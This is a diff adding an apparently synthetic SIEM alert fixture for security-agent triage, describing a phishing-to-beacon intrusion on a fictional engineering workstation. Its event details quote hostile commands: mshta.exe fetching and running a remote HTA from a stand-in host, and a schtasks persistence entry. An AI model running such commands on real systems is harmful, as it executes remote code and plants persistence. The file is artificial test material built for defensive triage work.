@@ -1,0 +1,94 @@
+{
+  "_synthetic": "SYNTHETIC SAMPLE for secure-agent-ops. Not real data. All hosts, users, IPs (RFC 5737 documentation ranges), and domains (example.com/.net/.org) are fictional.",
+  "alert": {
+    "alert_id": "SYN-2026-0005",
+    "rule_name": "RBA - Risk Threshold Exceeded for System Over 24 Hours - Rule",
+    "time": "2026-09-29T14:35:00Z",
+    "severity": "high",
+    "urgency": "high",
+    "security_domain": "threat",
+    "risk_object": "ws-eng-207.corp.example.com",
+    "risk_object_type": "system",
+    "risk_score_total": 160,
+    "risk_threshold": 100,
+    "window": "24h",
+    "contributing_risk_events": [
+      {
+        "time": "2026-09-29T08:12:03Z",
+        "source": "Authentication - Multiple Failed Logons for User - Rule",
+        "risk_score": 20,
+        "user": "rokafor-example",
+        "detail": "4 failed interactive logons, then success at 08:12:40Z",
+        "mitre_attack": [
+          "T1110.001"
+        ]
+      },
+      {
+        "time": "2026-09-29T09:30:15Z",
+        "source": "Endpoint - Rare Process Execution - Rule",
+        "risk_score": 10,
+        "user": "rokafor-example",
+        "detail": "process: C:\\Program Files\\ExampleCAD\\examplecad_license.exe",
+        "mitre_attack": []
+      },
+      {
+        "time": "2026-09-29T14:02:11Z",
+        "source": "Email - User Clicked Link in Later-Quarantined Message - Rule",
+        "risk_score": 20,
+        "user": "rokafor-example",
+        "detail": "url: http://docs-share.example.org/review?id=8812",
+        "mitre_attack": [
+          "T1566.002",
+          "T1204.001"
+        ]
+      },
+      {
+        "time": "2026-09-29T14:03:47Z",
+        "source": "Endpoint - Mshta Executing Remote Script - Rule",
+        "risk_score": 40,
+        "user": "rokafor-example",
+        "detail": "process: mshta.exe http://docs-share.example.org/r.hta (parent: msedge.exe)",
+        "mitre_attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "time": "2026-09-29T14:05:30Z",
+        "source": "Endpoint - Scheduled Task Created From User-Writable Path - Rule",
+        "risk_score": 30,
+        "user": "rokafor-example",
+        "detail": "process: schtasks.exe /create /tn \"OneDriveSyncHelper\" /tr \"C:\\Users\\rokafor-example\\AppData\\Roaming\\syncsvc.exe\" /sc minute /mo 15",
+        "mitre_attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "time": "2026-09-29T14:30:02Z",
+        "source": "Network - Beacon-like Periodic Outbound Connection - Rule",
+        "risk_score": 40,
+        "user": "rokafor-example",
+        "detail": "dest: updates-cdn.example.org (203.0.113.45), interval ~60s, 25 connections, process syncsvc.exe",
+        "mitre_attack": [
+          "T1071.001"
+        ]
+      }
+    ],
+    "description": "Aggregate risk for this system exceeded the threshold within 24 hours."
+  },
+  "context": {
+    "asset": {
+      "hostname": "ws-eng-207.corp.example.com",
+      "category": "workstation",
+      "business_unit": "Engineering",
+      "priority": "medium",
+      "notes": "Has access to internal source code repositories."
+    },
+    "identity": {
+      "user": "rokafor-example",
+      "full_name": "Riley Okafor (fictional)",
+      "department": "Engineering",
+      "privileged": false,
+      "account_type": "human"
+    }
+  }
+}
